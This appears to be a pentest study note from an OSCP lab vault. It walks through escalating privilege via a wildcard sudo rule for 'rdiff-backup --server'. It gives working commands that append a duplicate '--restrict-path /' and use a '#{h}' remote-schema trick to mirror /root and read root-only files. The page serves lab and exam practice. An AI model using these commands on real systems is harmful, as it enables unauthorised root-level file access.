# Linux - Rdiff-Backup Sudo Abuse

**Step 14A of 50 · Linux**

*Assess a passwordless `rdiff-backup --server` rule whose trailing wildcard allows restriction or protocol arguments to be changed.*

Fast syntax reference: [[OSCP COMMAND MASTER CHEATSHEET|OSCP Command Master Cheatsheet]] · Keep the exact sudo rule, version, parser behaviour, and read-only proof here.

> [!warning] Scope
> Use this page only on an authorised lab or exam target. The intended proof is a read-only retrieval of a controlled file. Do not alter the target filesystem or create persistence.

## When to use this page

Open this stage after [[Linux - Sudo Check]] shows a rule shaped like:

```text
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

The important finding is not merely that `rdiff-backup` is allowed. Preserve the fixed arguments, wildcard placement, and order exactly as shown by `sudo -l`.

## Confirm the binary and rule

> **Why:** These checks establish the exact version and sudo boundary before the backup protocol is tested.
```bash
sudo -n -l
command -v rdiff-backup
rdiff-backup --version
```

## Understand the restriction boundary

`--restrict-path /opt/backup` is intended to limit the server to one directory. A trailing wildcard can permit a second `--restrict-path /` to be appended. In implementations where the last occurrence wins, the duplicate option expands the readable source to the filesystem root.

Treat this as an argument-parsing finding and verify it with a read-only source before requesting sensitive paths.

## Satisfy the remote-schema check

`rdiff-backup` version 2 requires the remote schema to contain `{h}`. The local proof used `#{h}`: the placeholder is present for validation, while the leading `#` makes the substituted host token a shell comment so the command does not require a separate SSH service.

Run the safe path first:

```bash
mkdir -p /tmp/rdiff-safe
rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only #{h}" \
  backup localhost::/opt/backup /tmp/rdiff-safe
find /tmp/rdiff-safe -maxdepth 2 -type f -printf '%p\n'
```

The safe test proves that the local client and privileged server can complete the rdiff protocol. If it hangs, preserve the error and troubleshoot the transport before changing the path restriction. A buffered stdin bridge can delay small protocol messages; use the tested unbuffered/select-based bridge from the private transcript if the manual environment requires one.

## Request the root mirror

> **Why:** The second restriction is appended through the sudo-approved wildcard. The destination remains a local read-only mirror, so the proof is the recovered file rather than a target-side shell.
```bash
rm -rf /tmp/rdiff-root
rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / #{h}" \
  backup localhost::/root /tmp/rdiff-root
find /tmp/rdiff-root -maxdepth 3 -type f -printf '%p\n'
```

Read only the controlled proof required by the assessment, then copy it into private loot from the case workspace:

```bash
cat /tmp/rdiff-root/root.txt
```

## What did you get?

- [ ] A duplicate `--restrict-path /` is accepted and the root mirror contains the proof file → **Save the value privately, run `id` and `whoami`, then go to Step 21 · [[Linux - Clean Down]]**
- [ ] The safe mirror hangs → **Stop changing arguments; inspect buffering, process state, and the complete stderr transcript**
- [ ] The validator rejects the remote schema → **Confirm that `{h}` is present and retry the `#{h}` form; do not remove the placeholder**
- [ ] The last restriction does not override the first → **Record the parser behaviour and return to Step 15 · [[Linux - SUID Check]] or Step 17 · [[Linux - Credential Search]]**
- [ ] The sudo rule has no wildcard or does not include `--server` → **Use the exact rule as the authority and return to Step 14 · [[Linux - Sudo Check]]**

## Gotchas

- Duplicate options are parser-dependent. Test the exact binary and version rather than assuming the last value wins.
- `#{h}` is not cosmetic. It satisfies the rdiff placeholder validator while preventing an unnecessary network hop in the local proof.
- The local source is a directory, not a single file. Request `/root`, mirror it, and read the requested file from the mirror.
- A successful rdiff transfer is not itself root-shell proof. Record the server command, destination, file ownership, and identity output together.
- Keep root-only files, credentials, and private keys in loot. The vault should contain only the technique and private evidence paths.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- duplicate restriction injection and local rdiff protocol proof produced the root mirror

## Related stages

- [[Linux - Local Enum]]
- [[Linux - Credential Search]]
- [[Linux - Sudo Check]]
- [[Linux - Clean Down]]

## External Resources

- [rdiff-backup documentation](https://rdiff-backup.net/)
- [GTFOBins](https://gtfobins.github.io/)

## Why this matters for OSCP

This is a reusable sudo-review lesson: fixed arguments do not make a wildcard rule safe. Read the complete command, test duplicate-option behaviour, understand the helper's protocol, and prove the resulting access with the smallest read-only action.
